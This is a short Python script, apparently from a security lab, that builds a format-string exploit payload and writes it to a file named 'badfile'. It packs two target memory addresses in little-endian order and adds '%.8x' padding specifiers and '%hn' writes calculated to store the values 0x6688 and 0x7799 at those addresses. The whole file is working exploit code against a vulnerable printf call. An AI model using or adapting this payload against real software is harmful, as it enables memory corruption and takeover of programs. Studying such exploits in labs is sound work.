import sys

# Initialize the content array
CONTENT_LENGTH = 2000
content = bytearray(0x0 for i in range(CONTENT_LENGTH))

current_index = 0
# fmt1 = ("%.8x" * 0).encode()  # x is unsigned int as a hexadecimal number
# content[current_index : current_index + len(fmt1)] = fmt1
# current_index += len(fmt1)
# print("format specifiers 1 is ", fmt1)

lower_target_address = 0xFFFFCEC0
higher_target_address = lower_target_address + 2
content[current_index : current_index + 4] = higher_target_address.to_bytes(
    4, byteorder="little"
)
current_index += 4

content[current_index : current_index + 4] = b"!@#$"
current_index += 4

content[current_index : current_index + 4] = lower_target_address.to_bytes(
    4, byteorder="little"
)
current_index += 4

N = 4
num_of_padding_zeros = 0x6688 - 4 * 3 - 8 * (N - 1)
fmt2 = ("%.8x" * (N - 1) + f"%.{num_of_padding_zeros}x" + "%hn").encode()
content[current_index : current_index + len(fmt2)] = fmt2
current_index += len(fmt2)
print("format specifiers 2 is ", fmt2)

fmt3 = (f"%.{0x7799 - 0x6688}x" + "%hn" + "\n").encode()
content[current_index : current_index + len(fmt3)] = fmt3
print("format specifiers 3 is ", fmt3)

# Write the content to badfile
file = open("badfile", "wb")
file.write(content)
file.close()
